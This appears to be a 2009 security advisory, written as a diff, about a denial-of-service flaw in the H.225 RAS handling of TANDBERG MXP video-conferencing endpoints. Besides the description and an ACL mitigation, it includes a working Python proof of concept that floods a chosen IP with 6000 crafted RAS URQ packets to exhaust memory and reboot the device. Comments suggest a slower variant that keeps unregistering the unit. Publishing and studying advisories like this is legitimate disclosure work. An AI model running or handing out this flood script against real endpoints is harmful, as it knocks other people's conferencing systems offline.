@@ -1,0 +1,90 @@
+Security Advisory
+
+Platform : TANDBERG
+Date     : November 6, 2009
+Affected : All MXP FIPS140 Current as of December 8, 2009
+Tested   : F8.2, F8.0, F7.2, F6.3
+Unconf   : VCS, BC, C90
+Author   : otokoyama
+
+
+Problem Description:
+
+Issues with the H.225 RAS implementation in TANDBERG Codecs.
+*This has been confirmed when FIPS140 Mode is set to active.*
+
+For the DoS to affect that Tandberg, H.323 Gatekeeper mode must
+be set to "On" or "Auto" as opposed to off.
+
+The Tandberg Endpoint does not have to be registered with a gatekeeper.
+
+The DoS is simply sending a RAS URQ request >3280 times.
+The Tandberg endpoint will swiftly run out of memory to process the request
+and subsequently reboot. The packet repetition amount required to crash
+depends on how many other legitimate requests the Endpoint is holding in its
+stack, if the tester wishes for clean results she/he may wish to reboot the
+Endpoint before running the PoC.
+
+However it is difficult to fit in any payload after the crashing packet (in
+a live remote exploit)as the person attempting this would have no control
+over what is already in the Endpoint network stack but due to the nature of
+video conferencing.
+
+This DoS would be effective on a large number of Endpoints that are on
+public IP. It is quite possible that the routed Endpoints(traversal, NAT,
+Port Forwarding) would allow this packet through as it is seemingly
+legitimate(most VC Network Admins set up Deep Packet Inspection exclusions
+to the VC Endpoints due to the nature of RTP, which in TCPDUMP looks like a
+UDP flood anyway)
+
+This is by no means a new vuln and it has existed on many platforms and
+products till today (and still does ;)) but it's high time it got patched.
+
+Mitigation : Block RAS requests at the router with an ACL, destport:1719
+           : Invest in traversal infrastructure and deploy it
+correctly.
+
+Code attached. Feel free to vrfy.
+
+#-----------No error detection\ success confirmation ]\                    
+#						      /
+#		                -otk  _______________/
+		
+import socket, sys
+
+if len(sys.argv)!= 3:
+	print "\n[*] Usage: %s <ip> <port>\n" % sys.argv[0]
+	sys.exit(0)
+
+host = sys.argv[1]
+port = int(sys.argv[2]) 	#port 1719 by default
+
+pkt = (	
+	"\x18\x40\xf9\x12\x01\x00\xc0\xa8" 
+	"\x01\x23\x06\xb8\x4a\x00\x32\x00" 
+	"\x33\x00\x64\x00\x66\x00\x35\x00" 
+	"\x35\x00\x39\x00\x65\x00\x2d\x00" 
+	"\x31\x00\x65\x00\x61\x00\x66\x00"
+	"\x2d\x00\x31\x00\x31\x00\x62\x00" 
+	"\x32\x00\x2d\x00\x61\x00\x38\x00" 
+	"\x39\x00\x35\x00\x2d\x00\x30\x00" 
+	"\x30\x00\x31\x00\x30\x00\x66\x00"
+	"\x33\x00\x31\x00\x38\x00\x65\x00" 
+	"\x64\x00\x30\x00\x62\x00\x5f\x00" 
+	"\x62")
+
+print "[+] Connecting to %s on port %d" % (host,port)
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+i = 0
+while(1): 
+  i += 1				
+  if (i <= 6000):                            #Change to increase possibility of crash
+     data =  s.sendto ( pkt, ((host,port)) ) 
+     print "[+] Sending packet"              #remove this if you don't like spam
+  else:                                      #You could also change this area to send a slow 						     #interval RAS URQ, essentially unregistering 
+					     #the unit constantly, this wouldn't shut it 
+					     #down but would be very annoying.
+     break
+
+print "[+] done, if host is still up you lost, check tcpdump\n"
